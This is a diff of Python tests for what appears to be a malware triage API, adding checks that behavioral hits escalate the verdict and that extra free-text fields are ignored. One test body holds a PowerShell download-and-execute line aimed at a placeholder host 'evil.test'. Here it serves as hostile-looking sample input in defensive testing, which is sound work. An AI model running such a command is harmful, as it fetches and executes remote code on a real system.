@@ -92,10 +92,40 @@ def test_deobfuscate_caps_payload(seeded_retriever, tmp_path):
     assert v["verdict"] == "unknown"          # NOT "clean"
 
 
-def test_triage_verdict_is_pure(seeded_retriever, tmp_path):
+def test_triage_verdict_vt_malicious_ioc_still_escalates(seeded_retriever, tmp_path):
+    # Renamed from the old test_triage_verdict_is_pure (F9/D7): this only proves the
+    # vt_max==3 short-circuit in fuse() still wins over a behavioral hit -- it does NOT
+    # prove behavioral hits are honored or that free-text is ignored (both are covered
+    # by the two discriminating tests below, which is what actually closes F9).
     c = _client(seeded_retriever, tmp_path)
     r = c.post("/triage-verdict", json={
         "behavioral_hits": [{"rule_id": "exec.iex", "category": "exec", "evidence": "IEX"}],
         "ioc_verdicts": {"http://x": "malicious"},
         "fully_resolved": True, "flags": []})
     assert r.json()["verdict"] == "malicious"
+
+
+def test_triage_verdict_purity_behavioral_hit_escalates_without_malicious_ioc(seeded_retriever, tmp_path):
+    # F9/D7 (a): a behavioral hit ALONE, with NO malicious IOC in play, must escalate
+    # to suspicious. RED if the endpoint/fuse ever stopped honoring behavioral_hits
+    # (the old test only exercised the vt_max==3 short-circuit and would have passed
+    # even if behavioral_hits were ignored entirely).
+    c = _client(seeded_retriever, tmp_path)
+    r = c.post("/triage-verdict", json={
+        "behavioral_hits": [{"rule_id": "exec.iex", "category": "exec", "evidence": "IEX"}],
+        "ioc_verdicts": {}, "fully_resolved": True, "flags": []})
+    assert r.json()["verdict"] == "suspicious"
+
+
+def test_triage_verdict_purity_extra_free_text_key_is_ignored(seeded_retriever, tmp_path):
+    # F9/D7 (b): a well-formed benign body (no malicious IOC, no behavioral hit) plus
+    # an EXTRA unknown JSON key carrying hostile-looking free text must still verdict
+    # clean. Proves pydantic drops the unmodeled field and fuse() never reads it --
+    # RED if TriageVerdictRequest ever grew an advisory-intent field that leaked into
+    # fuse() or the endpoint started reading arbitrary extra keys.
+    c = _client(seeded_retriever, tmp_path)
+    r = c.post("/triage-verdict", json={
+        "behavioral_hits": [], "ioc_verdicts": {}, "fully_resolved": True, "flags": [],
+        "advisory_intent": "IEX(New-Object Net.WebClient).DownloadString('http://evil.test/x')",
+    })
+    assert r.json()["verdict"] == "clean"
